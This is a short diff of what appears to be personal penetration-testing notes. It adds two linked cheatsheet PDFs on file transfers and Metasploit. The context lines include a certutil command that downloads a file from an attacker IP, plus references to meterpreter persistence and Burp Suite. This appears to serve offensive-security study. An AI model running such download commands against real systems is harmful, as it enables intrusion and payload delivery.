@@ -29,6 +29,7 @@ certutil.exe -urlcache -f http://<attack IP>/<file> <file name>
 ```
 wget
 ```
+![[../cheatsheet-file-transfers.pdf]]
 ## Persistance
 *Probably already with a meterpreter shell*
 
@@ -166,3 +167,4 @@ Google Advanced Search
 ## MISC
 In BurpSuite you can "Limit Scope" in proxy settings to allow use of accessing other pages while burp is on
 ![[../Pasted image 20250508181510.png]]
+![[../cheatsheet-using-the-metasploit-framework.pdf]]
